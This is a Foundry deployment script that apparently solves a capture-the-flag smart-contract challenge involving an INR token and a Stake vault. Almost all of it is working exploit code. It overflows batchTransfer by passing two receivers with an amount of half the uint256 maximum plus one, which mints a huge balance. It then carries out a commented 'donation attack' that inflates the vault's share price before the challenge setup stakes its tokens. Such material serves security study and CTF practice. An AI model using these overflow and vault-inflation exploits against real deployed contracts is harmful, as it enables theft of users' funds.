// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {Setup} from "../src/Setup.sol";
import {INR} from "../src/INR.sol";
import {Stake} from "../src/Stake.sol";

contract Deploy is Script {


    Setup public setup = new Setup();
    INR public inr = INR(setup.inr());
    Stake public stake = Stake(setup.stake());

    function run() external {

        vm.startBroadcast();

        console.log(msg.sender);

        console.log(setup.solved());

        setup.claim();
        console.log(inr.balanceOf(msg.sender));


        address[] memory receivers = new address[](2);
        receivers[0] = msg.sender;
        receivers[1] = address(0);
        uint256 amount = ((type(uint256).max)/2)+1; //length * amount 
        inr.batchTransfer(receivers, amount);

        console.log(inr.balanceOf(msg.sender));


        console.log(stake.totalAssets());
        console.log(stake.asset());

        inr.approve(address(stake), 1);
        stake.deposit(1, msg.sender);

        console.log(stake.totalAssets());
        console.log(stake.asset());
        console.log(stake.totalSupply(), "hihi");

        // donation attack
        inr.transfer(address(stake), 50_000 ether); // share = asset * total_supply / total_asset, if we do this, it increase asset of the stake up but not increase the supply out 
        setup.stakeINR();

        console.log(stake.totalSupply());

        setup.solve();



        vm.stopBroadcast();
    }
}